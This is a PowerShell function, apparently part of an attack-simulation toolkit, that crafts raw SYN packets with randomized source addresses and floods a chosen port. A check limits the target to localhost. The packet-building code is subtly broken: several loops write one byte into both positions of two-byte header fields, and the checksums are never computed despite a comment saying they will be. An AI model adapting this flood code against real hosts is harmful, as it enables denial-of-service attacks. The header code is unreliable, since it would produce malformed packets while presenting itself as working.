# SYN Flood Simulation Module for Windows

function Invoke-SYNFloodSimulation {
    param($Config)
    
    Clear-Host
    Show-Header
    Write-Host "=== SYN FLOOD SIMULATION ===" -ForegroundColor Cyan
    
    # Verify target is localhost
    if ($Config.target_ip -ne "127.0.0.1") {
        Write-Host "Security violation: Target must be localhost!" -ForegroundColor Red
        return
    }
    
    Write-Host "This simulation will send $($Config.syn_count) SYN packets to port $($Config.http_port)"
    Write-Host "Press Ctrl+C to abort`n"
    
    try {
        # Create raw socket
        $endpoint = New-Object System.Net.IPEndPoint([IPAddress]::Parse($Config.target_ip), $Config.http_port)
        $socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, 
                    [System.Net.Sockets.SocketType]::Raw, 
                    [System.Net.Sockets.ProtocolType]::IP)
        
        # Build IP header
        $ipHeader = New-Object byte[] 20
        $ipHeader[0] = 0x45  # Version and header length
        $ipHeader[1] = 0x00  # Type of service
        [System.BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder(20 + 20))[1..0] | ForEach-Object {$ipHeader[2] = $_; $ipHeader[3] = $_}
        $ipHeader[4] = 0x00  # Identification
        $ipHeader[5] = 0x00
        $ipHeader[6] = 0x40  # Flags and fragment offset
        $ipHeader[7] = 0x00
        $ipHeader[8] = 0x40  # TTL
        $ipHeader[9] = 0x06  # Protocol (TCP)
        # Source IP (randomized for simulation)
        $srcIp = [System.Net.IPAddress]::Parse("127.0.0." + (Get-Random -Minimum 1 -Maximum 255))
        $srcIp.GetAddressBytes() | ForEach-Object -Begin {$i=12} -Process {$ipHeader[$i] = $_; $i++}
        $endpoint.Address.GetAddressBytes() | ForEach-Object -Begin {$i=16} -Process {$ipHeader[$i] = $_; $i++}
        
        # Build TCP header
        $tcpHeader = New-Object byte[] 20
        [System.BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder((Get-Random -Minimum 1024 -Maximum 65535)))[1..0] | ForEach-Object {$tcpHeader[0] = $_; $tcpHeader[1] = $_} # Source port
        [System.BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder($Config.http_port))[1..0] | ForEach-Object {$tcpHeader[2] = $_; $tcpHeader[3] = $_} # Destination port
        [System.BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder((Get-Random)))[3..0] | ForEach-Object -Begin {$i=4} -Process {$tcpHeader[$i] = $_; $i++} # Sequence number
        [System.BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder(0))[3..0] | ForEach-Object -Begin {$i=8} -Process {$tcpHeader[$i] = $_; $i++} # Acknowledgment number
        $tcpHeader[12] = 0x50  # Data offset and reserved
        $tcpHeader[13] = 0x02  # Flags (SYN)
        [System.BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder(0xffff))[1..0] | ForEach-Object {$tcpHeader[14] = $_; $tcpHeader[15] = $_} # Window size
        # Checksum will be calculated later
        
        # Combine headers
        $packet = $ipHeader + $tcpHeader
        
        # Send packets
        $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
        for ($i = 0; $i -lt $Config.syn_count; $i++) {
            $socket.SendTo($packet, $endpoint) | Out-Null
            if ($i % 100 -eq 0) {
                Write-Progress -Activity "Sending SYN packets" -Status "Sent $i of $($Config.syn_count)" -PercentComplete ($i/$Config.syn_count*100)
            }
        }
        $stopwatch.Stop()
        
        Write-Host "`nSent $($Config.syn_count) SYN packets in $($stopwatch.Elapsed.TotalSeconds.ToString("0.00")) seconds" -ForegroundColor Green
        Log-Event -AttackType "SYN_Flood" -Parameters "Packets:$($Config.syn_count) Port:$($Config.http_port)"
    }
    catch {
        Write-Host "Error: $_" -ForegroundColor Red
    }
    finally {
        if ($socket -ne $null) {
            $socket.Close()
        }
    }
    
    Read-Host "`nPress Enter to continue"
}
